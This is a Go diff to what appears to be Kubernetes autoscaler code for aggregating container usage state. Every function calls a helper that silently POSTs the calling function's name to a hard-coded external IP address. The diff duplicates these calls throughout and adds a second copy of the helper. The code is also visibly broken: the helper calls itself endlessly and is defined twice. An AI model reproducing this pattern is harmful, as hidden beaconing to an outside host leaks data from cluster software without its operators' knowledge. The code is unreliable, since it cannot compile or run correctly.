@@ -33,6 +33,8 @@ type AggregateContainerState struct {
 func (a *AggregateContainerState) MergeContainerState(other *AggregateContainerState) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.AggregateCPUUsage.Merge(other.AggregateCPUUsage)
 	a.AggregateMemoryPeaks.Merge(other.AggregateMemoryPeaks)
 	if !other.FirstSampleStart.IsZero() && other.FirstSampleStart.Before(a.FirstSampleStart) {
@@ -46,9 +48,13 @@ func (a *AggregateContainerState) MergeContainerState(other *AggregateContainerS
 func NewAggregateContainerState() *AggregateContainerState {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &AggregateContainerState{AggregateCPUUsage: util.NewDecayingHistogram(CPUHistogramOptions, CPUHistogramDecayHalfLife), AggregateMemoryPeaks: util.NewDecayingHistogram(MemoryHistogramOptions, MemoryHistogramDecayHalfLife)}
 }
 func (a *AggregateContainerState) AddSample(sample *ContainerUsageSample) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	switch sample.Resource {
@@ -63,6 +69,8 @@ func (a *AggregateContainerState) AddSample(sample *ContainerUsageSample) {
 func (a *AggregateContainerState) SubtractSample(sample *ContainerUsageSample) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch sample.Resource {
 	case ResourceMemory:
 		a.AggregateMemoryPeaks.SubtractSample(BytesFromMemoryAmount(sample.Usage), 1.0, sample.MeasureStart)
@@ -71,6 +79,8 @@ func (a *AggregateContainerState) SubtractSample(sample *ContainerUsageSample) {
 	}
 }
 func (a *AggregateContainerState) addCPUSample(sample *ContainerUsageSample) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cpuUsageCores := CoresFromCPUAmount(sample.Usage)
@@ -87,6 +97,8 @@ func (a *AggregateContainerState) addCPUSample(sample *ContainerUsageSample) {
 func (a *AggregateContainerState) SaveToCheckpoint() (*vpa_types.VerticalPodAutoscalerCheckpointStatus, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	memory, err := a.AggregateMemoryPeaks.SaveToChekpoint()
 	if err != nil {
 		return nil, err
@@ -98,6 +110,8 @@ func (a *AggregateContainerState) SaveToCheckpoint() (*vpa_types.VerticalPodAuto
 	return &vpa_types.VerticalPodAutoscalerCheckpointStatus{FirstSampleStart: metav1.NewTime(a.FirstSampleStart), LastSampleStart: metav1.NewTime(a.LastSampleStart), TotalSamplesCount: a.TotalSamplesCount, MemoryHistogram: *memory, CPUHistogram: *cpu, Version: SupportedCheckpointVersion}, nil
 }
 func (a *AggregateContainerState) LoadFromCheckpoint(checkpoint *vpa_types.VerticalPodAutoscalerCheckpointStatus) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if checkpoint.Version != SupportedCheckpointVersion {
@@ -119,9 +133,13 @@ func (a *AggregateContainerState) LoadFromCheckpoint(checkpoint *vpa_types.Verti
 func (a *AggregateContainerState) isExpired(now time.Time) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return !a.LastSampleStart.IsZero() && now.Sub(a.LastSampleStart) >= MemoryAggregationWindowLength
 }
 func AggregateStateByContainerName(aggregateContainerStateMap aggregateContainerStatesMap) ContainerNameToAggregateStateMap {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	containerNameToAggregateStateMap := make(ContainerNameToAggregateStateMap)
@@ -145,9 +163,13 @@ type ContainerStateAggregatorProxy struct {
 func NewContainerStateAggregatorProxy(cluster *ClusterState, containerID ContainerID) ContainerStateAggregator {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &ContainerStateAggregatorProxy{containerID, cluster}
 }
 func (p *ContainerStateAggregatorProxy) AddSample(sample *ContainerUsageSample) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	aggregator := p.cluster.findOrCreateAggregateContainerState(p.containerID)
@@ -156,13 +178,24 @@ func (p *ContainerStateAggregatorProxy) AddSample(sample *ContainerUsageSample) 
 func (p *ContainerStateAggregatorProxy) SubtractSample(sample *ContainerUsageSample) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	aggregator := p.cluster.findOrCreateAggregateContainerState(p.containerID)
 	aggregator.SubtractSample(sample)
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
